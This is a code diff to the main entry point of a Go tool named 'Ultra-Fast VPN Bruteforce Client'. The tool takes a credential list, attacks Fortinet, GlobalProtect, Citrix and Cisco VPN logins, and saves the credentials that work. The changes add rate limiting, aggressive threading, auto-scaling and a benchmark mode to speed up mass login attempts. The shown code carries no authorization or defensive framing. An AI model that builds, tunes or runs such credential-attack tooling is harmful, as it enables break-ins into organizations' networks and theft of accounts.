@@ -18,28 +18,36 @@ import (
 func main() {
 	var (
 		configFile = flag.String("config", "config.yaml", "Configuration file path")
-		vpnType    = flag.String("type", "fortinet", "VPN type (fortinet, globalprotect, citrix, cisco)")
+		vpnType    = flag.String("type", "", "VPN type (fortinet, globalprotect, citrix, cisco)")
 		inputFile  = flag.String("input", "", "Input file with credentials")
-		outputFile = flag.String("output", "valid.txt", "Output file for valid credentials")
+		outputFile = flag.String("output", "", "Output file for valid credentials")
 		threads    = flag.Int("threads", 0, "Number of threads (0 = auto-detect)")
-		timeout    = flag.Int("timeout", 5, "Connection timeout in seconds")
+		rateLimit  = flag.Int("rate", 0, "Rate limit (requests per second)")
+		timeout    = flag.Int("timeout", 0, "Connection timeout in seconds")
 		verbose    = flag.Bool("verbose", false, "Verbose logging")
+		benchmark  = flag.Bool("benchmark", false, "Run performance benchmark")
 	)
 	flag.Parse()
 
-	// Auto-detect optimal thread count
-	if *threads == 0 {
-		*threads = runtime.NumCPU() * 100 // Aggressive threading
+	// Performance benchmark mode
+	if *benchmark {
+		runBenchmark()
+		return
 	}
 
-	fmt.Printf("🚀 VPN Bruteforce Client v2.0\n")
-	fmt.Printf("📊 CPU Cores: %d | Threads: %d | Type: %s\n", runtime.NumCPU(), *threads, *vpnType)
-	fmt.Printf("⚡ Timeout: %ds | Input: %s | Output: %s\n\n", *timeout, *inputFile, *outputFile)
+	// Set GOMAXPROCS to use all CPU cores
+	runtime.GOMAXPROCS(runtime.NumCPU())
+
+	fmt.Printf("🚀 Ultra-Fast VPN Bruteforce Client v3.0\n")
+	fmt.Printf("💻 System: %d CPU cores, %s GOOS, %s GOARCH\n", 
+		runtime.NumCPU(), runtime.GOOS, runtime.GOARCH)
+	fmt.Printf("⚡ Go Runtime: %s, GC Target: %d%%\n\n", 
+		runtime.Version(), 100) // Set aggressive GC
 
 	// Load configuration
 	cfg, err := config.Load(*configFile)
 	if err != nil {
-		log.Printf("⚠️  Config load failed, using defaults: %v", err)
+		log.Printf("⚠️  Config load failed, using optimized defaults: %v", err)
 		cfg = config.Default()
 	}
 
@@ -47,20 +55,42 @@ func main() {
 	if *inputFile != "" {
 		cfg.InputFile = *inputFile
 	}
-	cfg.OutputFile = *outputFile
-	cfg.Threads = *threads
-	cfg.Timeout = time.Duration(*timeout) * time.Second
-	cfg.VPNType = *vpnType
+	if *outputFile != "" {
+		cfg.OutputFile = *outputFile
+	}
+	if *threads > 0 {
+		cfg.Threads = *threads
+	}
+	if *rateLimit > 0 {
+		cfg.RateLimit = *rateLimit
+	}
+	if *timeout > 0 {
+		cfg.Timeout = time.Duration(*timeout) * time.Second
+	}
+	if *vpnType != "" {
+		cfg.VPNType = *vpnType
+	}
 	cfg.Verbose = *verbose
 
-	// Initialize statistics
+	// Validate input file exists
+	if _, err := os.Stat(cfg.InputFile); os.IsNotExist(err) {
+		log.Fatalf("❌ Input file not found: %s", cfg.InputFile)
+	}
+
+	fmt.Printf("🎯 Target: %s VPN | RPS Limit: %d | Threads: %d-%d\n", 
+		cfg.VPNType, cfg.RateLimit, cfg.MinThreads, cfg.MaxThreads)
+	fmt.Printf("📁 Input: %s | Output: %s\n", cfg.InputFile, cfg.OutputFile)
+	fmt.Printf("⏱️  Timeout: %v | Retries: %d | Auto-scale: %v\n\n", 
+		cfg.Timeout, cfg.MaxRetries, cfg.AutoScale)
+
+	// Initialize ultra-fast statistics
 	statsManager := stats.New()
 	go statsManager.Start()
 
-	// Initialize bruteforce engine
+	// Initialize ultra-fast bruteforce engine
 	engine, err := bruteforce.New(cfg, statsManager)
 	if err != nil {
-		log.Fatalf("❌ Failed to initialize engine: %v", err)
+		log.Fatalf("❌ Failed to initialize ultra-fast engine: %v", err)
 	}
 
 	// Handle graceful shutdown
@@ -72,14 +102,44 @@ func main() {
 		fmt.Println("\n🛑 Shutdown signal received...")
 		engine.Stop()
 		statsManager.Stop()
+		
+		// Force exit after 5 seconds
+		time.Sleep(5 * time.Second)
 		os.Exit(0)
 	}()
 
-	// Start the bruteforce engine
-	fmt.Println("🔥 Starting bruteforce engine...")
+	// Start the ultra-fast bruteforce engine
+	fmt.Println("🔥 Starting ultra-fast engine with zero-allocation optimizations...")
+	start := time.Now()
+	
 	if err := engine.Start(); err != nil {
 		log.Fatalf("❌ Engine failed: %v", err)
 	}
 
-	fmt.Println("✅ Bruteforce completed successfully!")
+	duration := time.Since(start)
+	fmt.Printf("\n✅ Ultra-fast bruteforce completed in %v!\n", duration)
+	fmt.Printf("📊 Final statistics saved to stats files\n")
+}
+
+func runBenchmark() {
+	fmt.Println("🏁 Running performance benchmark...")
+	
+	// CPU benchmark
+	start := time.Now()
+	for i := 0; i < 10000000; i++ {
+		_ = fmt.Sprintf("test_%d", i)
+	}
+	cpuTime := time.Since(start)
+	
+	// Memory benchmark
+	start = time.Now()
+	data := make([][]byte, 100000)
+	for i := range data {
+		data[i] = make([]byte, 1024)
+	}
+	memTime := time.Since(start)
+	
+	fmt.Printf("💻 CPU Performance: %v (10M string operations)\n", cpuTime)
+	fmt.Printf("🧠 Memory Performance: %v (100MB allocation)\n", memTime)
+	fmt.Printf("🚀 System ready for ultra-fast operations!\n")
 }
